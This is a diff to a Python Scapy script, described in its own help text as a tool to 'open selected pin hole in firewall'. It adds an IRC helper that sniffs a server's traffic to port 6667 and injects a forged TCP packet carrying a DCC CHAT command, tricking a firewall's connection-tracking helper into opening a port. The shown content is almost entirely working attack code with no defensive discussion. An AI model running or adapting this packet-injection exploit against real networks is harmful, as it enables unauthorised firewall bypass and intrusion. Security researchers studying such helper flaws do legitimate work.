@@ -96,6 +96,52 @@ class ftp_helper(attack_target):
         except:
             sys.stderr.write("Unable to sniff on interface\n")
         
+class irc_helper(attack_target):
+    def ipnumber(self, ip):
+        ip=ip.rstrip().split('.')
+        ipn=0
+        while ip:
+            ipn=(ipn<<8)+int(ip.pop(0))
+        return ipn
+    def build_dcc_command(self):
+        return 'PRIVMSG opensvp :\x01DCC CHAT CHAT %d %d\x01\r\n' % (self.ipnumber(self.ip), self.port)
+    def build_filter(self):
+        return "tcp and src host %s and dst port 6667" % (self.ip)
+
+    def server_callback(self, pkt):
+        # any packet is ok
+        if self.sent == 0 and pkt[TCP].flags & 8 != 0:
+            if self.verbose:
+                print "Working on following base"
+                print pkt.show()
+            # set ether pkt src as dst
+            orig_src = pkt[Ether].src
+            orig_dst = pkt[Ether].dst
+            # change payload
+            att = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)/IP()/TCP()
+            att[IP] = pkt[IP]
+            att[IP].id = pkt[IP].id + 1
+            del att[IP].chksum
+            del att[IP].len
+            att[TCP].seq = pkt[TCP].seq + len(pkt[TCP].payload)
+            del att[TCP].chksum
+            att[TCP].payload = self.build_dcc_command()
+            # send packet
+            if self.verbose:
+                print "Sending attack packet"
+                print att.show()
+                sendp(att, iface=self.iface)
+            else:
+                sendp(att, iface=self.iface, verbose=0)
+            self.sent = 1
+            sys.exit(0)
+
+    def run(self):
+        try:
+            sniff(iface=self.iface, prn=self.server_callback, filter=self.build_filter(), store=0, timeout=20)
+        except:
+            sys.stderr.write("Unable to sniff on interface\n")
+
 
 parser = argparse.ArgumentParser(description='Open selected pin hole in firewall')
 parser.add_argument('-s', '--server', default='192.168.2.2', help='IP address of server to attack')
@@ -111,11 +157,14 @@ if not os.geteuid()==0:
     sys.exit(1)
 
 if args.helper == 'ftp':
-    ftptarget = ftp_helper()
-    ftptarget.ip = args.server
-    ftptarget.iface = args.iface
-    ftptarget.port = int(args.port)
-    ftptarget.verbose = args.verbose
-    ftptarget.run()
+    target = ftp_helper()
+elif args.helper == 'irc':
+    target = irc_helper()
 else:
     sys.exit("Selected protocol is currently unsupported")
+
+target.ip = args.server
+target.iface = args.iface
+target.port = int(args.port)
+target.verbose = args.verbose
+target.run()
